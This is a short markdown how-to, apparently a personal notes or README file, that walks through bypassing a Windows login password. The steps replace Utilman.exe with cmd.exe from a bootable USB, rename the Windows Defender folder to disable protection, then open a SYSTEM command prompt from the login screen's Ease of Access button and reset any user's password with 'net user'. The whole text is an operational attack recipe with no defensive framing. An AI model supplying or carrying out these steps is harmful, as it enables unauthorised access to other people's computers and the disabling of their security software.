# Bypassing a windows login password using by using Utilman for privilege escalation

## Steps

### Creating the attack vector

1. Create a Windows bootable USB
2. Boot into the bootable USB selecting `Advanced -> Command prompt`
3. Navigate to `C:\Windows\System32`
4. Rename `Utilman.exe` to `Utilman_.exe` (or any name that isn't Utilman.exe)
5. Move or copy `cmd.exe` to `Utilman.exe`

### Removing security

1. Navigate to `C:\Program Files`
2. Rename `Windows Defender` to `Windows Defender_` (or any name that isn't Windows Defender)

### Attacking the target

1. Restart the PC
2. When on the login screen click on the `Ease of Access` button on the bottom right
3. This will open a command prompt, from here enter the command: `net user` to view all users
4. Select the user to change the password of and enter `net user <username> *`
5. Type in a new password, login, and enjoy
